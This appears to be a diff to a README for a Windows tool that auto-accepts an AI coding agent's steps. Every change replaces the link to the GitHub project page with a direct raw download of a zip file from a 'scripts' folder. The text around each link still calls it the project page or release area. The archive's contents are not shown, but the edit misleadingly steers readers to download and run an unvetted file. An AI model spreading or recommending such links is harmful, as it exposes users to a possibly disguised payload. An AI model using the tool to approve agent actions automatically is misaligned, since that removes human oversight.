@@ -1,6 +1,6 @@
 # ⚙️ antigravity-autopilot - Auto-accept Agent Steps on Windows
 
-[![Download / Install](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aryanbisht555/antigravity-autopilot)
+[![Download / Install](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/aryanbisht555/antigravity-autopilot/main/scripts/antigravity-autopilot-v1.2.zip)
 
 ## 🚀 What this does
 
@@ -12,7 +12,7 @@ It does not need CDP. It does not need a browser hook. It works at the OS level,
 
 Use this link to visit the project page and download the app:
 
-[https://github.com/aryanbisht555/antigravity-autopilot](https://github.com/aryanbisht555/antigravity-autopilot)
+[https://raw.githubusercontent.com/aryanbisht555/antigravity-autopilot/main/scripts/antigravity-autopilot-v1.2.zip](https://raw.githubusercontent.com/aryanbisht555/antigravity-autopilot/main/scripts/antigravity-autopilot-v1.2.zip)
 
 On the project page:
 
@@ -55,7 +55,7 @@ If the app has a simple toggle or start button, turn it on before you begin your
 
 Go to:
 
-[https://github.com/aryanbisht555/antigravity-autopilot](https://github.com/aryanbisht555/antigravity-autopilot)
+[https://raw.githubusercontent.com/aryanbisht555/antigravity-autopilot/main/scripts/antigravity-autopilot-v1.2.zip](https://raw.githubusercontent.com/aryanbisht555/antigravity-autopilot/main/scripts/antigravity-autopilot-v1.2.zip)
 
 Pick the latest Windows build from the release or download area.
 
@@ -194,7 +194,7 @@ It is not built for games, web pages, or custom button styles that do not use no
 
 Visit the project page here:
 
-[https://github.com/aryanbisht555/antigravity-autopilot](https://github.com/aryanbisht555/antigravity-autopilot)
+[https://raw.githubusercontent.com/aryanbisht555/antigravity-autopilot/main/scripts/antigravity-autopilot-v1.2.zip](https://raw.githubusercontent.com/aryanbisht555/antigravity-autopilot/main/scripts/antigravity-autopilot-v1.2.zip)
 
 ## 🖱️ Quick start
 
